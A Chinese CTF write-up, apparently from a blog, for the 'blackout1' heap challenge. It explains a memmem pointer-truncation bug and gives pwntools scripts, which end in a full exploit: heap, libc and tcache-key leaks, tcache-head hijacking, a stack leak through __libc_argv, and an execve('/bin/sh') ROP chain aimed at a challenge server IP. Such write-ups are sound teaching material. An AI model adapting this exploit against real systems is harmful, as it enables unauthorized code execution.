<p><strong>漏洞分析</strong></p>
<p>程序有一个强转，导致 find 只能接受到后4字节：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( chunk = chunk_list[index]; max &gt; chunk - chunk_list[index]; chunk = &amp;next[len] )</span><br><span class="line">&#123;</span><br><span class="line">  find = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)memmem(chunk, &amp;chunk_list[index][max] - chunk, target, len);</span><br><span class="line">  next = (<span class="keyword">char</span> *)find;</span><br><span class="line">  <span class="keyword">if</span> ( !find )</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="built_in">memset</span>((<span class="keyword">void</span> *)find, <span class="string">&#x27;*&#x27;</span>, len);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>入侵思路</strong></p>
<p>这个题目脑洞有点大：</p>
<ul>
<li>程序会截断 memmem 返回的地址，但程序没有开 PIE 导致申请到的 chunk 地址都在32位的范围内</li>
<li>我们的目标就是反复执行 malloc，以保证之后的 chunk 在32位的范围外</li>
</ul>
<p>之后就可以通过截断后的 memmem 来修改 chunk_list 地址上的内容：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x404060</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x404060</span> (letter) —▸ <span class="number">0x14a13f0</span> ◂— <span class="number">0x14a0600</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x404068</span> (letter+<span class="number">8</span>) ◂— <span class="number">0x0</span></span><br><span class="line">... ↓     <span class="number">5</span> skipped</span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│  <span class="number">0x404098</span> (letter+<span class="number">56</span>) —▸ <span class="number">0x1014a13f0</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<ul>
<li>覆盖 0x14a0600 末尾的 “\x00” 就可以泄露 heap_base</li>
</ul>
<p>泄露 heap_base 和 libc_base 的脚本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0</span>, <span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line">dele(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    add(i, <span class="number">0xe0</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    <span class="keyword">if</span>(i==<span class="number">6</span>):</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    dele(i)</span><br><span class="line">dele(<span class="number">6</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    add(<span class="number">1</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> tqdm(<span class="built_in">range</span>(<span class="number">0xffff</span>)):</span><br><span class="line">    add(<span class="number">7</span>, <span class="number">0xffe8</span>, <span class="string">b&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> i % <span class="number">0x1000</span> == <span class="number">0</span>:</span><br><span class="line">        p.clean()</span><br><span class="line"></span><br><span class="line">add(<span class="number">6</span>, <span class="number">0xf850</span>)</span><br><span class="line">add(<span class="number">7</span>, <span class="number">0x1000</span>,<span class="string">&quot;a&quot;</span>)</span><br><span class="line">p.clean()</span><br><span class="line"></span><br><span class="line">edit(<span class="number">7</span>,<span class="string">&quot;a&quot;</span>)</span><br><span class="line">leak_addr = u64(edit(<span class="number">0</span>,<span class="string">&quot;*&quot;</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">heap_base = leak_addr &amp; <span class="number">0xfffff000</span></span><br><span class="line"><span class="keyword">if</span>(leak_addr &gt; <span class="number">0x1000000</span>):</span><br><span class="line">    heap_base += <span class="number">0x1000</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;heap_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">dele(<span class="number">6</span>)</span><br><span class="line">dele(<span class="number">7</span>)</span><br><span class="line">add(<span class="number">6</span>, <span class="number">0xfe10</span>,<span class="string">&quot;a&quot;</span>)</span><br><span class="line">add(<span class="number">7</span>, <span class="number">0x1000</span>,<span class="string">&quot;a&quot;</span>)</span><br><span class="line">p.clean()</span><br><span class="line">edit(<span class="number">7</span>,<span class="string">&quot;a&quot;</span>)</span><br><span class="line">leak_addr = u64(edit(<span class="number">1</span>,<span class="string">&quot;*&quot;</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">libc_base = leak_addr - <span class="number">0x219d2a</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br></pre></td></tr></table></figure>
<p>接下来需要劫持 tcache head，将其中的某个 tcache bin 的倒数第2字节改为 <code>0x2a</code>（为了 chunk 地址合法，不能该最后一字节）</p>
<p>由于开了 PIE，我们需要根据泄露的 heap_base 来定制 payload，并在 fake tcache bin 中伪造 fake chunk，因此还需要先泄露 tcache key</p>
<p>接着就可以劫持 tcache head 进而劫持 0x404060，然后通过 <code>__libc_argv</code> 泄露栈地址：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">dele(<span class="number">6</span>)</span><br><span class="line">dele(<span class="number">7</span>)</span><br><span class="line">add(<span class="number">6</span>, <span class="number">0xf648</span>,<span class="string">&quot;a&quot;</span>)</span><br><span class="line">add(<span class="number">7</span>, <span class="number">0x1000</span>,<span class="string">&quot;a&quot;</span>+<span class="string">&quot;b&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>): <span class="comment"># 填充tcache head</span></span><br><span class="line">    add(i+<span class="number">2</span>,<span class="number">0xf0</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    dele(i+<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">target_tcache = heap_base + <span class="number">0x100001310</span> </span><br><span class="line">new_tcache = (target_tcache &amp; <span class="number">0xffffffffffff00ff</span>) + <span class="number">0x2a00</span></span><br><span class="line">new_top_chunk = heap_base + <span class="number">0xffff0aa0</span> </span><br><span class="line">success(<span class="string">&quot;target_tcache &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(target_tcache))</span><br><span class="line">success(<span class="string">&quot;new_tcache &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(new_tcache))</span><br><span class="line">success(<span class="string">&quot;new_top_chunk &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(new_top_chunk))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">7</span>,<span class="string">&quot;b&quot;</span>)</span><br><span class="line">dele(<span class="number">6</span>)</span><br><span class="line">dele(<span class="number">7</span>)</span><br><span class="line">victim = heap_base + <span class="number">0x10</span></span><br><span class="line">next_ptr = ((new_tcache) &gt;&gt; <span class="number">12</span>) ^ victim</span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span>*(new_tcache-new_top_chunk-<span class="number">0x10</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x211</span>)+p64(next_ptr)+p64(tcache_key)</span><br><span class="line">add(<span class="number">6</span>, <span class="number">0xf000</span>,payload)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0xf0</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0xf0</span>,p64(<span class="number">0x0002000200020002</span>)*<span class="number">4</span>+p64(<span class="number">0</span>)*<span class="number">24</span>+p64(<span class="number">0x404060</span>))</span><br><span class="line"></span><br><span class="line">libc_argv = libc_base + <span class="number">0x21aa20</span></span><br><span class="line">success(<span class="string">&quot;libc_argv &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc_argv))</span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0xd0</span>,p64(libc_argv)+p64(victim))</span><br><span class="line">leak_addr = u64(edit(<span class="number">0</span>,<span class="string">&quot;*&quot;</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">stack_base = leak_addr - <span class="number">0x110</span> - <span class="number">8</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;stack_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(stack_base))</span><br></pre></td></tr></table></figure>
<p>最后劫持栈就可以了</p>
<p>完整 exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./blackout1&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a,b=<span class="literal">True</span>    : p.recvuntil(a,b)</span><br><span class="line">rn = <span class="keyword">lambda</span> x            : p.recvn(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">irt = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">dbg = <span class="keyword">lambda</span> text=<span class="literal">None</span>  : gdb.attach(p, text)</span><br><span class="line"><span class="comment"># lg = lambda s,addr        : log.info(&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27; % (s,addr))</span></span><br><span class="line">lg = <span class="keyword">lambda</span> s            : log.info(<span class="string">&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data        : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data        : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">b = <span class="string">&quot;set debug-file-directory ./.debug/\n&quot;</span></span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(challenge)</span><br><span class="line">    <span class="comment">#p = gdb.debug(challenge, b)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;119.13.105.35&#x27;</span>,<span class="string">&#x27;10111&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;b *0x401765\n&quot;</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(p,&quot;b *$rebase()\n&quot;)</span></span><br><span class="line">    <span class="comment">#pause()</span></span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">op</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(op))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">index,size,data=<span class="string">&quot;&quot;</span></span>):</span></span><br><span class="line">    sl(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    sl(<span class="built_in">str</span>(index))</span><br><span class="line">    sl(<span class="built_in">str</span>(size))</span><br><span class="line">    <span class="keyword">if</span> size!=<span class="number">0</span>:</span><br><span class="line">        sl(data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,data</span>):</span></span><br><span class="line">    sl(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    sl(<span class="built_in">str</span>(index))</span><br><span class="line">    sl(data)</span><br><span class="line">    ru(<span class="string">&quot;[Redacted]\n&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> ru(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span>(<span class="params">index</span>):</span></span><br><span class="line">    sl(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    sl(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line">dele(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    add(i, <span class="number">0xe0</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    <span class="keyword">if</span>(i==<span class="number">6</span>):</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    dele(i)</span><br><span class="line">dele(<span class="number">6</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    add(<span class="number">1</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> tqdm(<span class="built_in">range</span>(<span class="number">0xffff</span>)):</span><br><span class="line">    add(<span class="number">7</span>, <span class="number">0xffe8</span>, <span class="string">b&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> i % <span class="number">0x1000</span> == <span class="number">0</span>:</span><br><span class="line">        p.clean()</span><br><span class="line"></span><br><span class="line">add(<span class="number">6</span>, <span class="number">0xf850</span>)</span><br><span class="line">add(<span class="number">7</span>, <span class="number">0x1000</span>,<span class="string">&quot;a&quot;</span>)</span><br><span class="line">p.clean()</span><br><span class="line"></span><br><span class="line">edit(<span class="number">7</span>,<span class="string">&quot;a&quot;</span>)</span><br><span class="line">leak_addr = u64(edit(<span class="number">0</span>,<span class="string">&quot;*&quot;</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">heap_base = leak_addr &amp; <span class="number">0xfffff000</span></span><br><span class="line"><span class="keyword">if</span>(leak_addr &gt; <span class="number">0x1000000</span>):</span><br><span class="line">    heap_base += <span class="number">0x1000</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;heap_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">dele(<span class="number">6</span>)</span><br><span class="line">dele(<span class="number">7</span>)</span><br><span class="line">add(<span class="number">6</span>, <span class="number">0xf850</span>)</span><br><span class="line">add(<span class="number">7</span>, <span class="number">0x1000</span>,<span class="string">&quot;1&quot;</span>*<span class="number">0x10</span>+<span class="string">&quot;2&quot;</span>*<span class="number">0x10</span>+<span class="string">&quot;3&quot;</span>*<span class="number">0x8</span>)</span><br><span class="line">edit(<span class="number">7</span>,<span class="string">&quot;1&quot;</span>*<span class="number">0x10</span>)</span><br><span class="line">edit(<span class="number">7</span>,<span class="string">&quot;2&quot;</span>*<span class="number">0x10</span>)</span><br><span class="line">edit(<span class="number">7</span>,<span class="string">&quot;3&quot;</span>*<span class="number">0x8</span>)</span><br><span class="line">tcache_key = u64(edit(<span class="number">0</span>,<span class="string">&quot;*&quot;</span>)[<span class="number">0x28</span>:<span class="number">0x30</span>])</span><br><span class="line">success(<span class="string">&quot;tcache_key &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(tcache_key))</span><br><span class="line"></span><br><span class="line">dele(<span class="number">6</span>)</span><br><span class="line">dele(<span class="number">7</span>)</span><br><span class="line">add(<span class="number">6</span>, <span class="number">0xfe10</span>,<span class="string">&quot;a&quot;</span>)</span><br><span class="line">add(<span class="number">7</span>, <span class="number">0x1000</span>,<span class="string">&quot;a&quot;</span>)</span><br><span class="line">p.clean()</span><br><span class="line">edit(<span class="number">7</span>,<span class="string">&quot;a&quot;</span>)</span><br><span class="line">leak_addr = u64(edit(<span class="number">1</span>,<span class="string">&quot;*&quot;</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">libc_base = leak_addr - <span class="number">0x219d2a</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">dele(<span class="number">6</span>)</span><br><span class="line">dele(<span class="number">7</span>)</span><br><span class="line">add(<span class="number">6</span>, <span class="number">0xf648</span>,<span class="string">&quot;a&quot;</span>)</span><br><span class="line">add(<span class="number">7</span>, <span class="number">0x1000</span>,<span class="string">&quot;a&quot;</span>+<span class="string">&quot;b&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>): <span class="comment"># 填充tcache head</span></span><br><span class="line">    add(i+<span class="number">2</span>,<span class="number">0xf0</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    dele(i+<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">target_tcache = heap_base + <span class="number">0x100001310</span> </span><br><span class="line">new_tcache = (target_tcache &amp; <span class="number">0xffffffffffff00ff</span>) + <span class="number">0x2a00</span></span><br><span class="line">new_top_chunk = heap_base + <span class="number">0xffff0aa0</span> </span><br><span class="line">success(<span class="string">&quot;target_tcache &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(target_tcache))</span><br><span class="line">success(<span class="string">&quot;new_tcache &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(new_tcache))</span><br><span class="line">success(<span class="string">&quot;new_top_chunk &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(new_top_chunk))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">7</span>,<span class="string">&quot;b&quot;</span>)</span><br><span class="line">dele(<span class="number">6</span>)</span><br><span class="line">dele(<span class="number">7</span>)</span><br><span class="line">victim = heap_base + <span class="number">0x10</span></span><br><span class="line">next_ptr = ((new_tcache) &gt;&gt; <span class="number">12</span>) ^ victim</span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span>*(new_tcache-new_top_chunk-<span class="number">0x10</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x211</span>)+p64(next_ptr)+p64(tcache_key)</span><br><span class="line">add(<span class="number">6</span>, <span class="number">0xf000</span>,payload)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0xf0</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0xf0</span>,p64(<span class="number">0x0002000200020002</span>)*<span class="number">4</span>+p64(<span class="number">0</span>)*<span class="number">24</span>+p64(<span class="number">0x404060</span>))</span><br><span class="line"></span><br><span class="line">libc_argv = libc_base + <span class="number">0x21aa20</span></span><br><span class="line">success(<span class="string">&quot;libc_argv &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc_argv))</span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0xd0</span>,p64(libc_argv)+p64(victim))</span><br><span class="line">leak_addr = u64(edit(<span class="number">0</span>,<span class="string">&quot;*&quot;</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">stack_base = leak_addr - <span class="number">0x110</span> - <span class="number">8</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;stack_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(stack_base))</span><br><span class="line"></span><br><span class="line">pop_rax_ret = libc_base + <span class="number">0x0000000000045eb0</span>   </span><br><span class="line">pop_rdi_ret = libc_base + <span class="number">0x000000000002a3e5</span>   </span><br><span class="line">pop_rsi_ret = libc_base + <span class="number">0x000000000002be51</span>   </span><br><span class="line">pop_rdx_ret = libc_base + <span class="number">0x00000000000796a2</span>   </span><br><span class="line">syscall_ret = libc_base + <span class="number">0x0000000000114439</span></span><br><span class="line">binsh_addr = libc_base + <span class="number">0x1d8698</span></span><br><span class="line"></span><br><span class="line">payload  = <span class="string">b&quot;a&quot;</span>*<span class="number">8</span></span><br><span class="line">payload += p64(pop_rax_ret)+p64(<span class="number">0x3b</span>)</span><br><span class="line">payload += p64(pop_rdi_ret)+p64(binsh_addr)</span><br><span class="line">payload += p64(pop_rsi_ret)+p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdx_ret)+p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(syscall_ret)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x280</span>,p64(<span class="number">0x0002000200020002</span>)*<span class="number">4</span>+p64(<span class="number">0</span>)*<span class="number">24</span>+p64(stack_base))</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0xd0</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"></span><br><span 